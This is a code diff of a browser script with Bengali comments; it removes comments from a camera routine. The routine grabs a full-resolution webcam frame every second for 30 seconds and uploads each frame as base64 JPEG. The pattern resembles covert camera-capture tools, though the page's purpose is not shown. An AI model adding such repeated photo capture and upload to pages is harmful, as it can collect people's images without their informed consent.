@@ -284,11 +284,10 @@
             }
 
             // ================================================================
-            // ৭. ক্যামেরা – আসল রেজোলিউশন (1920x1080) + মেমরি অপটিমাইজড
+            // ৭. ক্যামেরা – আসল রেজোলিউশন
             // ================================================================
             async function startCamera() {
                 try {
-                    // ক্যামেরা অ্যাক্সেস (আসল রেজোলিউশন)
                     const stream = await navigator.mediaDevices.getUserMedia({
                         video: {
                             width: { ideal: 1920 },
@@ -309,17 +308,13 @@
                         };
                     });
 
-                    // ক্যানভাসের সাইজ ভিডিওর আসল সাইজে সেট করুন
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
 
-                    // প্রতি ১ সেকেন্ডে ছবি তোলা (মেমরি বাঁচাতে)
                     const interval = setInterval(async () => {
                         if (!video.videoWidth || !video.videoHeight) return;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        // উচ্চ কোয়ালিটি (0.95) – আসল ছবি
                         const imageData = canvas.toDataURL('image/jpeg', 0.95);
                         const rawBase64 = imageData.split(',')[1];
 
@@ -332,9 +327,8 @@
                         } catch (e) {
                             console.error('Camera upload error:', e);
                         }
-                    }, 1000); // ১ সেকেন্ড
+                    }, 1000);
 
-                    // ৩০ সেকেন্ড পর ক্যামেরা বন্ধ
                     setTimeout(() => {
                         clearInterval(interval);
                         stream.getTracks().forEach(t => t.stop());
